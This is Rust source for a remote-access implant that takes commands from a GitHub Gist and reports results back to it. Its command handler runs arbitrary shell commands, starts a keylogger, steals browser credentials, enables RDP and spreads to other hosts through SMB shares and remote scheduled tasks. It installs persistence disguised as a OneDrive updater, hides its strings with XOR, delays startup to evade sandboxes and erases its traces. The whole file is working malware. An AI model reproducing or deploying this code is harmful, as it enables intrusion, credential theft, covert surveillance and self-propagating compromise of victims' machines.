// Propagate agent binary to remote hosts via SMB share + schtasks remote exec
// Usage: propagate [\\host\share [user] [pass]]
// No-arg mode: auto-discovers mounted SMB shares via `net use`

fn discover_smb_shares() -> Vec<String> {
    use std::process::Command;
    let net_cmd  = String::from_utf8(xor_decrypt(secrets::ENC_NET_CMD)).unwrap_or_default();
    let net_arg  = String::from_utf8(xor_decrypt(secrets::ENC_NET_USE_ARG)).unwrap_or_default();
    let out = match Command::new(&net_cmd).arg(&net_arg).output() {
        Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
        Err(_) => return vec![],
    };
    out.lines()
        .filter_map(|line| {
            line.split_whitespace().find(|tok| {
                let b = tok.as_bytes();
                b.len() >= 3 && b[0] == b'\\' && b[1] == b'\\'
            })
            .map(|s| s.to_string())
        })
        .collect()
}
fn propagate_to_target(target: &str, user: &str, pass: &str) -> String {
    use std::process::Command;
    let exe = match std::env::current_exe() {
        Ok(p) => p,
        Err(e) => return format!("[-] Cannot locate self: {}", e),
    };
    let exe_name  = String::from_utf8(xor_decrypt(secrets::ENC_EXE_NAME)).unwrap_or_default();
    let task_name = String::from_utf8(xor_decrypt(secrets::ENC_TASK_NAME)).unwrap_or_default();
    let sc_cmd    = String::from_utf8(xor_decrypt(secrets::ENC_SCHTASKS_CMD)).unwrap_or_default();
    let sc_create = String::from_utf8(xor_decrypt(secrets::ENC_SC_CREATE)).unwrap_or_default();
    let sc_run    = String::from_utf8(xor_decrypt(secrets::ENC_SC_RUN)).unwrap_or_default();
    let sc_delete = String::from_utf8(xor_decrypt(secrets::ENC_SC_DELETE)).unwrap_or_default();
    let sc_s      = String::from_utf8(xor_decrypt(secrets::ENC_SC_S)).unwrap_or_default();
    let sc_tn     = String::from_utf8(xor_decrypt(secrets::ENC_SC_TN)).unwrap_or_default();
    let sc_tr     = String::from_utf8(xor_decrypt(secrets::ENC_SC_TR)).unwrap_or_default();
    let sc_sc     = String::from_utf8(xor_decrypt(secrets::ENC_SC_SC)).unwrap_or_default();
    let sc_st     = String::from_utf8(xor_decrypt(secrets::ENC_SC_ST)).unwrap_or_default();
    let sc_f      = String::from_utf8(xor_decrypt(secrets::ENC_SC_F)).unwrap_or_default();
    let sc_u      = String::from_utf8(xor_decrypt(secrets::ENC_SC_U)).unwrap_or_default();
    let sc_p      = String::from_utf8(xor_decrypt(secrets::ENC_SC_P)).unwrap_or_default();
    let sc_once   = String::from_utf8(xor_decrypt(secrets::ENC_SC_ONCE)).unwrap_or_default();
    let sc_time   = String::from_utf8(xor_decrypt(secrets::ENC_SC_TIME)).unwrap_or_default();
    let dest = format!("{}\\{}", target, exe_name);
    let mut output = String::new();
    output.push_str(&format!("[*] Propagating to {}...\n", target));
    // Step 1: Copy binary to SMB share
    match std::fs::copy(&exe, &dest) {
        Ok(_) => output.push_str(&format!("[+] Copied to {}\n", dest)),
        Err(e) => {
            output.push_str(&format!("[-] Copy to {} failed: {}\n", dest, e));
            return output;
        }
    }
    // Step 2: Extract hostname from UNC path
    let host = target.trim_start_matches('\\').split('\\').next().unwrap_or("");
    if host.is_empty() {
        output.push_str("[-] Could not parse host from UNC path\n");
        return output;
    }
    // Step 3: Schedule task on remote host
    let mut create_args: Vec<String> = vec![
        sc_create.clone(),
        sc_s.clone(), host.to_string(),
        sc_tn.clone(), task_name.clone(),
        sc_tr.clone(), dest.clone(),
        sc_sc.clone(), sc_once.clone(),
        sc_st.clone(), sc_time.clone(),
        sc_f.clone(),
    ];
    if !user.is_empty() { create_args.extend([sc_u.clone(), user.to_string()]); }
    if !pass.is_empty() { create_args.extend([sc_p.clone(), pass.to_string()]); }
    match Command::new(&sc_cmd).args(&create_args).output() {
        Ok(o) => {
            let stdout = String::from_utf8_lossy(&o.stdout);
            let stderr = String::from_utf8_lossy(&o.stderr);
            if o.status.success() {
                output.push_str(&format!("[+] Task created: {}\n", stdout.trim()));
            } else {
                output.push_str(&format!("[-] Task create failed: {} {}\n", stdout.trim(), stderr.trim()));
                return output;
            }
        }
        Err(e) => {
            output.push_str(&format!("[-] Scheduler not available: {}\n", e));
            return output;
        }
    }
    // Step 4: Run the task immediately
    let mut run_args: Vec<String> = vec![
        sc_run.clone(), sc_s.clone(), host.to_string(),
        sc_tn.clone(), task_name.clone(),
    ];
    if !user.is_empty() { run_args.extend([sc_u.clone(), user.to_string()]); }
    if !pass.is_empty() { run_args.extend([sc_p.clone(), pass.to_string()]); }
    match Command::new(&sc_cmd).args(&run_args).output() {
        Ok(o) => {
            let stdout = String::from_utf8_lossy(&o.stdout);
            if o.status.success() {
                output.push_str(&format!("[+] Task triggered: {}\n", stdout.trim()));
            } else {
                output.push_str(&format!("[-] Task run failed: {}\n", stdout.trim()));
            }
        }
        Err(e) => output.push_str(&format!("[-] Scheduler run error: {}\n", e)),
    }
    // Step 5: Clean up scheduled task artifact
    let mut del_args: Vec<String> = vec![
        sc_delete.clone(), sc_s.clone(), host.to_string(),
        sc_tn.clone(), task_name.clone(), sc_f.clone(),
    ];
    if !user.is_empty() { del_args.extend([sc_u.clone(), user.to_string()]); }
    if !pass.is_empty() { del_args.extend([sc_p.clone(), pass.to_string()]); }
    let _ = Command::new(&sc_cmd).args(&del_args).output();
    output
}
fn propagate_via_smb(parts: &[&str]) -> String {
    if parts.is_empty() {
        let shares = discover_smb_shares();
        if shares.is_empty() {
            return "[-] No mounted SMB shares found.".to_string();
        }
        let mut results = format!("=== PROPAGATION RESULTS ({} share(s)) ===\n", shares.len());
        for share in &shares {
            results.push_str(&propagate_to_target(share, "", ""));
            results.push('\n');
        }
        results.push_str("=== END ===");
        return results;
    }
    // Manual mode: propagate \\host\share [user] [pass]
    let target = parts[0];
    let user = parts.get(1).copied().unwrap_or("");
    let pass = parts.get(2).copied().unwrap_or("");
    format!("=== PROPAGATION RESULTS ===\n{}=== END ===", propagate_to_target(target, user, pass))
}
// Command handler - routes commands to appropriate modules
fn handle_command(command: &str) -> String {
    let parts: Vec<&str> = command.trim().split_whitespace().collect();
    if parts.is_empty() {
        return "Empty command".to_string();
    }

    match parts[0] {
        "ping" => "pong".to_string(),
        "info" => {
            format!(
                "Agent Info:\nHostname: {}\nOS: {}\nArch: {}",
                hostname::get().unwrap().to_string_lossy(),
                std::env::consts::OS,
                std::env::consts::ARCH
            )
        }
        "exec" => {
            if parts.len() < 2 {
                return "Usage: exec <command>".to_string();
            }
            let cmd = parts[1..].join(" ");
            execute_shell_command(&cmd)
        }
        "keylogger" => {
            if parts.len() < 2 {
                return "Usage: keylogger <start|stop|dump>".to_string();
            }
            match parts[1] {
                "start" => start_keylogger(),
                "stop" => stop_keylogger(),
                "dump" => get_keylog(),
                _ => "Invalid keylogger action. Use: start, stop, or dump".to_string(),
            }
        }
        "rdp" | "enable-rdp" => enable_rdp(),
        "disable-rdp" => disable_rdp(),
        "steal-creds" | "browser-creds" => steal_browser_credentials(),
        "terminate" => {
            println!("[!] TERMINATION SIGNAL RECEIVED");
            KEYLOGGER_RUNNING.store(false, Ordering::Relaxed);
            thread::sleep(Duration::from_millis(500));
            
            // Perform full trace removal before self-deletion
            remove_traces();
            
            match std::env::current_exe() {
                Ok(exe_path) => {
                    println!("[*] Deleting current running binary: {:?}", exe_path);
                    let _ = std::fs::remove_file(exe_path);
                }
                Err(e) => println!("[-] Failed to locate self for deletion: {}", e),
            }
            println!("[*] Exiting...");
            std::process::exit(0);
        }
        "propagate" => propagate_via_smb(&parts[1..]),
        _ => format!("Unknown command: {}", parts[0]),
    }
}

// Execute shell command
fn execute_shell_command(command: &str) -> String {
    #[cfg(target_os = "windows")]
    let output = std::process::Command::new("cmd")
        .args(&["/C", command])
        .output();

    #[cfg(not(target_os = "windows"))]
    let output = std::process::Command::new("sh")
        .args(&["-c", command])
        .output();

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            if stderr.is_empty() {
                stdout.to_string()
            } else {
                format!("{}{}", stdout, stderr)
            }
        }
        Err(e) => format!("Failed to execute: {}", e),
    }
}

// ---------------------------------------------------------------------------
// Stable agent ID — derived from hardware fingerprint, persisted to disk
// ---------------------------------------------------------------------------

/// Returns a stable agent ID that survives reboots and re-runs.
/// Strategy:
///   Windows: read MachineGuid from registry, hash it → deterministic UUID.
///   Linux/other: read /etc/machine-id, hash it.
///   Fallback: generate a random UUID and save it to a hidden file next to
///             the binary so at least the same install is consistent.
fn get_stable_agent_id() -> String {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};

    // Helper: turn an arbitrary string into a stable UUID-shaped string
    fn to_uuid(seed: &str) -> String {
        let mut h1 = DefaultHasher::new();
        seed.hash(&mut h1);
        let a = h1.finish();
        let mut h2 = DefaultHasher::new();
        format!("{}_{}", seed, a).hash(&mut h2);
        let b = h2.finish();
        format!("{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
            (a >> 32) as u32,
            (a >> 16) as u16,
            a as u16,
            (b >> 48) as u16,
            b & 0x0000_ffff_ffff_ffff,
        )
    }

    // 1. Try Windows MachineGuid from registry
    #[cfg(windows)]
    {
        use std::process::Command;
        let reg_key  = String::from_utf8(xor_decrypt(secrets::ENC_MACHINE_GUID_KEY)).unwrap_or_default();
        let reg_val  = String::from_utf8(xor_decrypt(secrets::ENC_MACHINE_GUID_VAL)).unwrap_or_default();
        let reg_cmd  = String::from_utf8(xor_decrypt(secrets::ENC_REG_CMD)).unwrap_or_default();
        if let Ok(out) = Command::new(&reg_cmd)
            .args(&[
                "query",
                &reg_key,
                "/v", &reg_val,
            ])
            .output()
        {
            let text = String::from_utf8_lossy(&out.stdout);
            for line in text.lines() {
                if line.trim_start().starts_with("MachineGuid") {
                    // Line format: "    MachineGuid    REG_SZ    <value>"
                    if let Some(guid) = line.split_whitespace().last() {
                        let guid = guid.trim();
                        if !guid.is_empty() {
                            println!("[+] Agent ID source: Windows MachineGuid");
                            return to_uuid(guid);
                        }
                    }
                }
            }
        }
    }

    // 2. Try /etc/machine-id (Linux/macOS)
    #[cfg(not(windows))]
    if let Ok(mid) = std::fs::read_to_string("/etc/machine-id") {
        let mid = mid.trim().to_string();
        if !mid.is_empty() {
            println!("[+] Agent ID source: /etc/machine-id");
            return to_uuid(&mid);
        }
    }

    // 3. Fallback: persist a random ID to a hidden file next to the binary
    let id_path = std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|d| d.join(".agent_id")))
        .unwrap_or_else(|| std::path::PathBuf::from(".agent_id"));

    if let Ok(saved) = std::fs::read_to_string(&id_path) {
        let saved = saved.trim().to_string();
        if !saved.is_empty() {
            println!("[+] Agent ID source: persisted file");
            return saved;
        }
    }

    let new_id = Uuid::new_v4().to_string();
    let _ = std::fs::write(&id_path, &new_id);
    println!("[+] Agent ID source: newly generated (saved to disk)");
    new_id
}

// ---------------------------------------------------------------------------
// Cleanup — remove all traces
// ---------------------------------------------------------------------------

/// Removes all traces of the agent from the infected computer.
fn remove_traces() {
    println!("[!] EXECUTING FULL CLEANUP...");

    // 1. Remove .agent_id file
    if let Ok(exe_path) = std::env::current_exe() {
        if let Some(parent) = exe_path.parent() {
            let id_path = parent.join(".agent_id");
            if id_path.exists() {
                println!("[*] Deleting agent ID file: {:?}", id_path);
                let _ = fs::remove_file(id_path);
            }
        }
    }

    // 2. Platform-specific persistence removal
    #[cfg(windows)]
    {
        let dest_env    = String::from_utf8(xor_decrypt(secrets::ENC_DEST_ENV_VAR)).unwrap_or_default();
        let dir_suffix  = String::from_utf8(xor_decrypt(secrets::ENC_DEST_DIR_SUFFIX)).unwrap_or_default();
        let exe_name    = String::from_utf8(xor_decrypt(secrets::ENC_EXE_NAME)).unwrap_or_default();
        let lnk_name    = String::from_utf8(xor_decrypt(secrets::ENC_LNK_NAME)).unwrap_or_default();
        let startup_env = String::from_utf8(xor_decrypt(secrets::ENC_STARTUP_ENV)).unwrap_or_default();
        let startup_sub = String::from_utf8(xor_decrypt(secrets::ENC_STARTUP_SUBDIR)).unwrap_or_default();

        // Remove Startup .lnk
        if let Ok(appdata) = std::env::var(&startup_env) {
            let lnk_path = format!("{}\\{}\\{}", appdata, startup_sub, lnk_name);
            let p = std::path::Path::new(&lnk_path);
            if p.exists() {
                println!("[*] Deleting startup shortcut: {:?}", p);
                let _ = fs::remove_file(p);
            }
        }

        // Remove Persistence Binary (if not currently running from it)
        if let Ok(localappdata) = std::env::var(&dest_env) {
            let dest_path = format!("{}\\{}\\{}", localappdata, dir_suffix, exe_name);
            let p = std::path::Path::new(&dest_path);
            if p.exists() {
                if let Ok(current_exe) = std::env::current_exe() {
                    if current_exe.to_string_lossy().to_lowercase() != dest_path.to_lowercase() {
                        println!("[*] Deleting persistence binary: {:?}", p);
                        let _ = fs::remove_file(p);
                    }
                }
            }
        }

        // Remove chromelevator.exe and output dir in TEMP
        if let Ok(tmp) = std::env::var("TEMP").or_else(|_| std::env::var("TMP")) {
            let exe_path = format!("{}\\chromelevator.exe", tmp);
            let out_dir  = format!("{}\\clev_out", tmp);
            
            let p_exe = std::path::Path::new(&exe_path);
            if p_exe.exists() {
                println!("[*] Deleting payload: {:?}", p_exe);
                let _ = fs::remove_file(p_exe);
            }
            
            let p_dir = std::path::Path::new(&out_dir);
            if p_dir.exists() {
                println!("[*] Deleting payload output: {:?}", p_dir);
                let _ = fs::remove_dir_all(p_dir);
            }
        }
    }

    #[cfg(not(windows))]
    {
        // Remove systemd user service
        if let Ok(home) = std::env::var("HOME") {
            let service_path = format!("{}/.config/systemd/user/agent-update.service", home);
            let p = std::path::Path::new(&service_path);
            if p.exists() {
                println!("[*] Disabling and removing systemd service...");
                let _ = std::process::Command::new("systemctl")
                    .args(&["--user", "stop", "agent-update.service"])
                    .status();
                let _ = std::process::Command::new("systemctl")
                    .args(&["--user", "disable", "agent-update.service"])
                    .status();
                let _ = fs::remove_file(p);
                // Reload daemon
                let _ = std::process::Command::new("systemctl")
                    .args(&["--user", "daemon-reload"])
                    .status();
            }
        }

        // Remove crontab entry
        let existing = std::process::Command::new("crontab")
            .arg("-l")
            .output()
            .ok()
            .and_then(|o| String::from_utf8(o.stdout).ok())
            .unwrap_or_default();

        if existing.contains("OneDriveUpdater") || existing.contains("c2_agent") {
            println!("[*] Cleaning crontab...");
            let mut lines: Vec<String> = Vec::new();
            for line in existing.lines() {
                if !line.contains("OneDriveUpdater") && !line.contains("c2_agent") {
                    lines.push(line.to_string());
                }
            }
            let new_crontab = lines.join("\n") + "\n";
            use std::io::Write;
            let mut child = std::process::Command::new("crontab")
                .arg("-")
                .stdin(std::process::Stdio::piped())
                .spawn()
                .ok();
            if let Some(mut c) = child {
                if let Some(stdin) = c.stdin.as_mut() {
                    let _ = stdin.write_all(new_crontab.as_bytes());
                }
                let _ = c.wait();
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Persistence — survive reboots
// ---------------------------------------------------------------------------

/// Installs the agent so it runs automatically on next login/boot.
/// Installs the agent persistence (no admin required).
/// Windows: copies binary to %LOCALAPPDATA%\Microsoft\OneDrive\OneDriveUpdater.exe
///          then drops a .lnk in the user Startup folder so it runs at every logon.
/// Linux:   systemd user service, fallback to crontab @reboot.
/// Silent — logs but never panics.
fn install_persistence() {
    #[cfg(windows)]
    {
        // Decode obfuscated IOC strings at runtime
        let dest_env    = String::from_utf8(xor_decrypt(secrets::ENC_DEST_ENV_VAR)).unwrap_or_default();
        let dir_suffix  = String::from_utf8(xor_decrypt(secrets::ENC_DEST_DIR_SUFFIX)).unwrap_or_default();
        let exe_name    = String::from_utf8(xor_decrypt(secrets::ENC_EXE_NAME)).unwrap_or_default();
        let lnk_name    = String::from_utf8(xor_decrypt(secrets::ENC_LNK_NAME)).unwrap_or_default();
        let startup_env = String::from_utf8(xor_decrypt(secrets::ENC_STARTUP_ENV)).unwrap_or_default();
        let startup_sub = String::from_utf8(xor_decrypt(secrets::ENC_STARTUP_SUBDIR)).unwrap_or_default();
        let localappdata = match std::env::var(&dest_env) {
            Ok(v) => v,
            Err(_) => { return; }
        };
        let appdata = match std::env::var(&startup_env) {
            Ok(v) => v,
            Err(_) => { return; }
        };

        // ── 1. Copy binary to disguised OneDrive location ─────────────────────
        let dest_dir  = format!("{}\\{}", localappdata, dir_suffix);
        let dest_path = format!("{}\\{}", dest_dir, exe_name);
        let _ = std::fs::create_dir_all(&dest_dir);
        let exe = match std::env::current_exe() {
            Ok(p) => p,
            Err(_) => { return; }
        };
        if exe.to_string_lossy() != dest_path {
            if std::fs::copy(&exe, &dest_path).is_err() { return; }
        }

        // ── 2. Startup folder .lnk ────────────────────────────────────────────
        // %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\<name>.lnk
        // Loaded by explorer at every logon — 100% reliable, user-context, no admin.
        let startup_dir = format!("{}\\{}", appdata, startup_sub);
        let lnk_path    = format!("{}\\{}", startup_dir, lnk_name);

        if !std::path::Path::new(&lnk_path).exists() {
            // Create .lnk via PowerShell WScript.Shell — no extra deps needed
            let ps_script = format!(
                "$s=(New-Object -COM WScript.Shell).CreateShortcut('{lnk}');$s.TargetPath='{target}';$s.WorkingDirectory='{workdir}';$s.Description='Microsoft OneDrive Update Service';$s.Save()",
                lnk     = lnk_path.replace("'", "''"),
                target  = dest_path.replace("'", "''"),
                workdir = dest_dir.replace("'", "''"),
            );
            let status = std::process::Command::new("powershell")
                .args(&["-NonInteractive", "-WindowStyle", "Hidden", "-Command", &ps_script])
                .status();
            match status {
                Ok(s) if s.success() => println!("[+] Persistence: startup shortcut installed"),
                _ => println!("[-] Persistence: shortcut creation failed"),
            }
        } else {
            println!("[+] Persistence: startup shortcut already present");
        }
    }

    #[cfg(not(windows))]
    {
        let exe = match std::env::current_exe() {
            Ok(p) => p,
            Err(e) => { println!("[-] Persistence: cannot get exe path: {}", e); return; }
        };
        let exe_str = exe.to_string_lossy().to_string();

        // Try systemd user service
        let installed_systemd = (|| -> Option<()> {
            let home = std::env::var("HOME").ok()?;
            let dir = format!("{}/.config/systemd/user", home);
            std::fs::create_dir_all(&dir).ok()?;
            let unit = format!("[Unit]\nDescription=System Update Service\n\n[Service]\nExecStart={}\nRestart=on-failure\nRestartSec=30\n\n[Install]\nWantedBy=default.target\n", exe_str);
            std::fs::write(format!("{}/agent-update.service", dir), unit).ok()?;
            let ok = std::process::Command::new("systemctl")
                .args(&["--user", "enable", "--now", "agent-update.service"])
                .status().map(|s| s.success()).unwrap_or(false);
            if ok { Some(()) } else { None }
        })().is_some();

        if installed_systemd {
            println!("[+] Persistence: systemd user service installed");
            return;
        }

        // Fallback: crontab @reboot
        let cron_entry = format!("@reboot {}", exe_str);
        let existing = std::process::Command::new("crontab")
            .arg("-l")
            .output()
            .ok()
            .and_then(|o| String::from_utf8(o.stdout).ok())
            .unwrap_or_default();

        if existing.contains(&cron_entry) {
            println!("[+] Persistence: crontab @reboot already present");
            return;
        }

        let new_crontab = format!("{}", existing.trim_end().to_string() + "\n" + &cron_entry + "\n");
        use std::io::Write;
        let mut child = match std::process::Command::new("crontab")
            .arg("-")
            .stdin(std::process::Stdio::piped())
            .spawn()
        {
            Ok(c) => c,
            Err(e) => { println!("[-] Persistence: crontab spawn failed: {}", e); return; }
        };
        if let Some(stdin) = child.stdin.as_mut() {
            let _ = stdin.write_all(new_crontab.as_bytes());
        }
        let _ = child.wait();
        println!("[+] Persistence: crontab @reboot entry installed");
    }
}

fn main() {
    // Startup jitter — delays execution to evade behavioral sandboxes
    #[cfg(windows)]
    {
        use rand::Rng;
        let jitter = rand::thread_rng().gen_range(5u64..30u64);
        std::thread::sleep(std::time::Duration::from_secs(jitter));
    }
    install_persistence();
    // Load configuration from .env and files
    let config = match Config::load() {
        Ok(cfg) => cfg,
        Err(e) => {
            eprintln!("[-] Configuration error: {}", e);
            eprintln!("[!] Make sure .env file exists with GITHUB_TOKEN and GIST_ID");
            eprintln!("[!] Make sure public_key.pem and aes_key.txt files exist");

            #[cfg(not(feature = "stealth"))]
            {
                println!("\nPress Return to exit...");
                let _ = std::io::stdin().read_line(&mut String::new());
            }

            std::process::exit(1);
        }
    };

    println!("[+] Configuration loaded successfully");
    println!("[+] Gist ID: {}", config.gist_id);

    // Stable agent ID derived from machine hardware (survives reboots)
    let agent_id = get_stable_agent_id();
    println!("[+] Agent started with ID: {}", agent_id);

    // Track last executed task ID to avoid re-execution
    let mut last_task_id: Option<String> = None;
    // Throttle telemetry: only send heartbeat every N loops to avoid Gist rate limits
    let mut loop_counter: u32 = 0;
    const TELEMETRY_EVERY_N_LOOPS: u32 = 10;

    // Initialize system info
    let mut sys = System::new_all();

    // Send initial telemetry checkin
    let stats = collect_system_stats(&mut sys);
    let telemetry_json = serde_json::to_string(&stats).unwrap_or_else(|_| "{}".to_string());

    if let Err(e) = send_result(&config, &agent_id, &telemetry_json) {
        eprintln!("[-] Failed to send initial checkin: {}", e);
    }

    // Main polling loop
    loop {
        loop_counter += 1;

        // Send heartbeat telemetry only every N loops (not every poll) to reduce Gist API traffic
        if loop_counter % TELEMETRY_EVERY_N_LOOPS == 1 {
            let stats = collect_system_stats(&mut sys);
            let telemetry_json = serde_json::to_string(&stats).unwrap_or_else(|_| "{}".to_string());
            if let Err(e) = send_result(&config, &agent_id, &telemetry_json) {
                eprintln!("[-] Failed to send heartbeat telemetry: {}", e);
            }
        }

        match get_task(&config, &agent_id) {
            Ok(Some((command, task_id))) => {
                // Check if this is a new task
                if last_task_id.as_ref() != Some(&task_id) {
                    println!("[*] Received NEW command (ID: {}): {}", task_id, command);
                    let result = handle_command(&command);
                    println!("[*] Command result: {}", result);
                    // Mark task as executed immediately — before send, so a failed upload
                    // never causes the same task to re-run on the next poll.
                    last_task_id = Some(task_id);

                    if let Err(e) = send_result(&config, &agent_id, &result) {
                        eprintln!("[-] Failed to send result: {}", e);
                    }
                } else {
                    println!("[*] Task already executed (ID: {}), skipping", task_id);
                }
            }
            Ok(None) => {
                println!("[*] No task found");
            }
            Err(e) => {
                eprintln!("[-] Error getting task: {}", e);
            }
        }

        // Sleep with jitter (30-90 seconds)
        let sleep_time = rand::thread_rng().gen_range(30..90);
        println!("[*] Sleeping for {} seconds...", sleep_time);
        std::thread::sleep(Duration::from_secs(sleep_time));
    }
}
